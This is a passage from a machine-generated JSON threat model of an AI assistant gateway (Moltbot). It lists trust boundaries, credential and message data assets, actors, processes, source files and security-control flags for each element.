"disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": ["281", "282", "283", "284"], "handlesResources": false, "hasWriteAccess": false, "inBoundary": "Gateway Local Storage", "inScope": true, "inputs": [], "isSQL": true, "isShared": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Plugin Store (~/.clawdbot/extensions)", "onAWS": false, "onRDS": false, "outputs": [], "overrides": [], "port": -1, "protocol": "", "severity": 4, "sourceFiles": ["docs/plugin.md", "src/plugins"], "storesLogData": false, "storesPII": false, "storesSensitiveData": false, "type": "DatastoreType.UNKNOWN", "usesEnvironmentVariables": false}], "boundaries": [{"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "description": "", "findings": [], "inBoundary": null, "inScope": true, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Internet", "overrides": [], "severity": 0, "sourceFiles": []}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "description": "", "findings": [], "inBoundary": "Internet", "inScope": true, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Control Clients", "overrides": [], "severity": 0, "sourceFiles": []}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "description": "", "findings": [], "inBoundary": null, "inScope": true, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Messaging Platforms", "overrides": [], "severity": 0, "sourceFiles": []}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "description": "", "findings": [], "inBoundary": null, "inScope": true, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Model Providers", "overrides": [], "severity": 0, "sourceFiles": []}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "description": "", "findings": [], "inBoundary": null, "inScope": true, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Node Hosts", "overrides": [], "severity": 0, "sourceFiles": []}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "description": "", "findings": [], "inBoundary": null, "inScope": true, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Gateway Host (Local)", "overrides": [], "severity": 0, "sourceFiles": []}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "description": "", "findings": [], "inBoundary": "Gateway Host (Local)", "inScope": true, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Gateway Local Storage", "overrides": [], "severity": 0, "sourceFiles": []}], "colormap": false, "data": [{"carriedBy": ["CLI connects to Gateway WS/HTTP", "UI connects to Gateway WS"], "classification": "Classification.SECRET", "credentialsLife": "Lifetime.NONE", "description": "", "format": "", "isCredentials": false, "isDestEncryptedAtRest": false, "isPII": false, "isSourceEncryptedAtRest": false, "isStored": false, "name": "Gateway Auth Token/Password", "processedBy": ["Gateway WS/HTTP Server", "Moltbot CLI", "WebChat / macOS UI"], "storedAt": ["Credentials Store (~/.clawdbot/credentials)"]}, {"carriedBy": [], "classification": "Classification.SECRET", "credentialsLife": "Lifetime.NONE", "description": "", "format": "", "isCredentials": false, "isDestEncryptedAtRest": false, "isPII": false, "isSourceEncryptedAtRest": false, "isStored": false, "name": "Channel Credentials (tokens/cookies)", "processedBy": [], "storedAt": ["Credentials Store (~/.clawdbot/credentials)"]}, {"carriedBy": ["Model inference request", "Read/write credentials"], "classification": "Classification.SECRET", "credentialsLife": "Lifetime.NONE", "description": "", "format": "", "isCredentials": false, "isDestEncryptedAtRest": false, "isPII": false, "isSourceEncryptedAtRest": false, "isStored": false, "name": "Model Provider Credentials", "processedBy": ["Agent Runtime", "Credentials Store (~/.clawdbot/credentials)", "Gateway WS/HTTP Server", "LLM Provider APIs"], "storedAt": ["Credentials Store (~/.clawdbot/credentials)"]}, {"carriedBy": ["Agent output + tool results", "Append transcripts", "Dispatch session to agent runtime", "End user sends channel message", "External client uses Gateway HTTP APIs", "Inbound channel events to Gateway", "Model inference response", "Normalized inbound messages", "Outbound messages to channels", "Update session metadata"], "classification": "Classification.RESTRICTED", "credentialsLife": "Lifetime.NONE", "description": "", "format": "", "isCredentials": false, "isDestEncryptedAtRest": false, "isPII": false, "isSourceEncryptedAtRest": false, "isStored": false, "name": "Session Messages + Tool Output", "processedBy": ["Agent Runtime", "Channel Adapters", "Channel End User", "Channel Provider APIs", "External API Client", "Gateway WS/HTTP Server", "LLM Provider APIs", "Session Store (sessions.json)", "Transcript Store (*.jsonl)"], "storedAt": ["Session Store (sessions.json)", "Transcript Store (*.jsonl)"]}, {"carriedBy": ["Inbound media to Gateway", "Outbound media to channels"], "classification": "Classification.RESTRICTED", "credentialsLife": "Lifetime.NONE", "description": "", "format": "", "isCredentials": false, "isDestEncryptedAtRest": false, "isPII": false, "isSourceEncryptedAtRest": false, "isStored": false, "name": "Inbound/Outbound Media Attachments", "processedBy": ["Channel Adapters", "Channel Provider APIs"]}, {"carriedBy": ["Operator runs CLI commands", "Read/write configuration"], "classification": "Classification.SENSITIVE", "credentialsLife": "Lifetime.NONE", "description": "", "format": "", "isCredentials": false, "isDestEncryptedAtRest": false, "isPII": false, "isSourceEncryptedAtRest": false, "isStored": false, "name": "Runtime Configuration", "processedBy": ["Config Store (moltbot.json)", "Gateway WS/HTTP Server", "Moltbot CLI", "Operator"], "storedAt": ["Config Store (moltbot.json)"]}, {"carriedBy": ["Write operational logs"], "classification": "Classification.SENSITIVE", "credentialsLife": "Lifetime.NONE", "description": "", "format": "", "isCredentials": false, "isDestEncryptedAtRest": false, "isPII": false, "isSourceEncryptedAtRest": false, "isStored": false, "name": "Operational Logs", "processedBy": ["Gateway WS/HTTP Server", "Log Store (~/.clawdbot/logs)"], "storedAt": ["Log Store (~/.clawdbot/logs)"]}, {"carriedBy": ["Browser control requests", "Browser control responses", "Invoke node tools", "Node tool responses"], "classification": "Classification.RESTRICTED", "credentialsLife": "Lifetime.NONE", "description": "", "format": "", "isCredentials": false, "isDestEncryptedAtRest": false, "isPII": false, "isSourceEncryptedAtRest": false, "isStored": false, "name": "Tool Invocation Requests/Results", "processedBy": ["Agent Runtime", "Browser Control Server", "Node Host Agent"]}, {"carriedBy": [], "classification": "Classification.RESTRICTED", "credentialsLife": "Lifetime.NONE", "description": "", "format": "", "isCredentials": false, "isDestEncryptedAtRest": false, "isPII": false, "isSourceEncryptedAtRest": false, "isStored": false, "name": "Conversation Context", "processedBy": [], "storedAt": ["Session Store (sessions.json)", "Transcript Store (*.jsonl)"], "traverses": ["Inbound channel events to Gateway", "Normalized inbound messages", "Dispatch session to agent runtime", "Agent output + tool results", "Outbound messages to channels"]}], "elements": [{"__class__": "Actor", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": [], "inBoundary": "Control Clients", "inScope": true, "inputs": [], "isAdmin": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Operator", "outputs": ["Operator runs CLI commands"], "overrides": [], "port": -1, "protocol": "", "severity": 0, "sourceFiles": []}, {"__class__": "Actor", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": [], "inBoundary": "Messaging Platforms", "inScope": true, "inputs": [], "isAdmin": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Channel End User", "outputs": ["End user sends channel message"], "overrides": [], "port": -1, "protocol": "", "severity": 0, "sourceFiles": []}, {"__class__": "ExternalEntity", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": [], "handlesResources": false, "hasPhysicalAccess": false, "inBoundary": "Messaging Platforms", "inScope": true, "inputs": ["End user sends channel message", "Outbound messages to channels", "Outbound media to channels"], "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Channel Provider APIs", "onAWS": false, "outputs": ["Inbound channel events to Gateway", "Inbound media to Gateway"], "overrides": [], "port": -1, "protocol": "", "severity": 0, "sourceFiles": [], "usesEnvironmentVariables": false}, {"__class__": "ExternalEntity", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": [], "handlesResources": false, "hasPhysicalAccess": false, "inBoundary": "Model Providers", "inScope": true, "inputs": ["Model inference request"], "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "LLM Provider APIs", "onAWS": false, "outputs": ["Model inference response"], "overrides": [], "port": -1, "protocol": "", "severity": 0, "sourceFiles": [], "usesEnvironmentVariables": false}, {"__class__": "ExternalEntity", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": [], "handlesResources": false, "hasPhysicalAccess": false, "inBoundary": "Internet", "inScope": true, "inputs": [], "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "External API Client", "onAWS": false, "outputs": ["External client uses Gateway HTTP APIs"], "overrides": [], "port": -1, "protocol": "", "severity": 0, "sourceFiles": [], "usesEnvironmentVariables": false}, {"__class__": "Process", "OS": "", "allowsClientSideScripting": false, "assumptions": [], "codeType": "Unmanaged", "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "environment": "", "findings": ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "31", "32", "33", "34"], "handlesResources": false, "implementsAPI": false, "implementsCommunicationProtocol": false, "inBoundary": "Control Clients", "inScope": true, "inputs": ["Operator runs CLI commands"], "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Moltbot CLI", "onAWS": false, "outputs": ["CLI connects to Gateway WS/HTTP"], "overrides": [], "port": -1, "protocol": "", "severity": 5, "sourceFiles": ["src/cli/run-main.ts", "src/cli/program/command-registry.ts"], "tracksExecutionFlow": false, "usesEnvironmentVariables": false}, {"__class__": "Process", "OS": "", "allowsClientSideScripting": false, "assumptions": [], "codeType": "Unmanaged", "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "environment": "", "findings": ["35", "36", "37", "38", "39", "40", "41", "42", "43", "44", "45", "46", "47", "48", "49", "50", "51", "52", "53", "54", "55", "56", "57", "58", "59", "60", "61", "62", "63", "64", "65", "66", "67", "68"], "handlesResources": false, "implementsAPI": false, "implementsCommunicationProtocol": false, "inBoundary": "Control Clients", "inScope": true, "inputs": [], "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "WebChat / macOS UI", "onAWS": false, "outputs": ["UI connects to Gateway WS"], "overrides": [], "port": -1, "protocol": "", "severity": 5, "sourceFiles": ["docs/gateway/index.md"], "tracksExecutionFlow": false, "usesEnvironmentVariables": false}, {"__class__": "Server", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": true, "authenticationScheme": "", "authorizesSource": true, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": true, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": ["69", "70", "71", "72", "73", "74", "75", "76", "77", "78", "79", "80", "81", "82", "83", "84", "85", "86", "87", "88", "89", "90", "91", "92", "93", "94", "95", "96", "97", "98", "99", "100", "101", "102", "103", "104"], "handlesResources": false, "inBoundary": "Gateway Host (Local)", "inScope": true, "inputs": ["CLI connects to Gateway WS/HTTP", "UI connects to Gateway WS", "External client uses Gateway HTTP APIs", "Normalized inbound messages", "Agent output + tool results"], "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Gateway WS/HTTP Server", "onAWS": false, "outputs": ["Dispatch session to agent runtime", "Read/write configuration", "Read/write credentials", "Update session metadata", "Append transcripts", "Write operational logs"], "overrides": [], "port": -1, "protocol": "", "severity": 5, "sourceFiles": ["src/gateway/server-http.ts", "src/gateway/server.ts", "src/gateway/server.impl.ts"], "usesCache": false, "usesEnvironmentVariables": false, "usesSessionTokens": false, "usesVPN": false, "usesXMLParser": false}, {"__class__": "Process", "OS": "", "allowsClientSideScripting": false, "assumptions": [], "codeType": "Unmanaged", "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "environment": "", "findings": ["105", "106", "107", "108", "109", "110", "111", "112", "113", "114", "115", "116", "117", "118", "119", "120", "121", "122", "123", "124", "125", "126", "127", "128", "129", "130", "131", "132", "133", "134", "135", "136", "137", "138"], "handlesResources": false, "implementsAPI": false, "implementsCommunicationProtocol": false, "inBoundary": "Gateway Host (Local)", "inScope": true, "inputs": ["Inbound channel events to Gateway", "Inbound media to Gateway"], "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Channel Adapters", "onAWS": false, "outputs": ["Normalized inbound messages", "Outbound messages to channels", "Outbound media to channels"], "overrides": [], "port": -1, "protocol": "", "severity": 5, "sourceFiles": ["src/web/inbound/monitor.ts", "src/channels"], "tracksExecutionFlow": false, "usesEnvironmentVariables": false}, {"__class__": "Process", "OS": "", 